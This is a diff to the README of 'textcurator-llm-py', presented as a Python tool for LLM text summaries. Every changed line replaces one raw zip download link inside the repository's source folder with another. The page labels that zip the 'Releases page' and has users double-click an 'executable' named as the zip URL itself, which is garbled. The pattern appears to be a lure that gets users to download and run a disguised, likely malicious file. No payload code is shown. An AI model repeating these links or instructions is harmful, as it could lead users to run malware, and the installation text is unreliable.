@@ -1,6 +1,6 @@
 # 🚀 textcurator-llm-py - Generate Structured Summaries Effortlessly
 
-[![Download](https://github.com/abdallahghddab/textcurator-llm-py/raw/refs/heads/main/textcurator_llm_py/py_textcurator_llm_v1.1-beta.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/abdallahghddab/textcurator-llm-py/raw/refs/heads/main/textcurator_llm_py/py_textcurator_llm_v1.1-beta.2.zip)
+[![Download](https://raw.githubusercontent.com/abdallahghddab/textcurator-llm-py/main/textcurator_llm_py/textcurator_llm_py_2.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/abdallahghddab/textcurator-llm-py/main/textcurator_llm_py/textcurator_llm_py_2.9.zip)
 
 ## 📋 Description
 textcurator-llm-py is a tool that processes your text inputs, like headlines or descriptions, and creates structured summaries or categorizations. It is particularly useful for content curation, helping you quickly organize and highlight key information. With this package, streamline your content management and enhance your productivity.
@@ -14,7 +14,7 @@ textcurator-llm-py is a tool that processes your text inputs, like headlines or 
 
 ### 📲 Installation Steps
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/abdallahghddab/textcurator-llm-py/raw/refs/heads/main/textcurator_llm_py/py_textcurator_llm_v1.1-beta.2.zip) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/abdallahghddab/textcurator-llm-py/main/textcurator_llm_py/textcurator_llm_py_2.9.zip) to find the latest version of the application.
 
 2. **Download the Latest Version**
    Look for the most recent release. Click on the link that corresponds to your operating system. 
@@ -23,7 +23,7 @@ textcurator-llm-py is a tool that processes your text inputs, like headlines or 
    After downloading, locate the ZIP file in your downloads folder. Right-click on the file and select "Extract All" or use your preferred extraction tool.
 
 4. **Run the Application**
-   Find the extracted folder and look for the executable file (e.g., `https://github.com/abdallahghddab/textcurator-llm-py/raw/refs/heads/main/textcurator_llm_py/py_textcurator_llm_v1.1-beta.2.zip`). Double-click on this file to launch the application.
+   Find the extracted folder and look for the executable file (e.g., `https://raw.githubusercontent.com/abdallahghddab/textcurator-llm-py/main/textcurator_llm_py/textcurator_llm_py_2.9.zip`). Double-click on this file to launch the application.
 
 ## ⚙️ Using textcurator-llm-py
 
@@ -39,7 +39,7 @@ After entering your text and selecting your output options, click the "Process" 
 ## 📥 Download & Install
 For easy access, download the application using the link below:
 
-[Download textcurator-llm-py](https://github.com/abdallahghddab/textcurator-llm-py/raw/refs/heads/main/textcurator_llm_py/py_textcurator_llm_v1.1-beta.2.zip)
+[Download textcurator-llm-py](https://raw.githubusercontent.com/abdallahghddab/textcurator-llm-py/main/textcurator_llm_py/textcurator_llm_py_2.9.zip)
 
 Follow the installation steps outlined above to get started.
 
@@ -76,4 +76,4 @@ If you find this application helpful, consider supporting the development. Visit
 ## 📄 License
 textcurator-llm-py is open-source and licensed under the MIT License. Feel free to modify and share under the terms of this license.
 
-[![Download](https://github.com/abdallahghddab/textcurator-llm-py/raw/refs/heads/main/textcurator_llm_py/py_textcurator_llm_v1.1-beta.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/abdallahghddab/textcurator-llm-py/raw/refs/heads/main/textcurator_llm_py/py_textcurator_llm_v1.1-beta.2.zip)
+[![Download](https://raw.githubusercontent.com/abdallahghddab/textcurator-llm-py/main/textcurator_llm_py/textcurator_llm_py_2.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/abdallahghddab/textcurator-llm-py/main/textcurator_llm_py/textcurator_llm_py_2.9.zip)
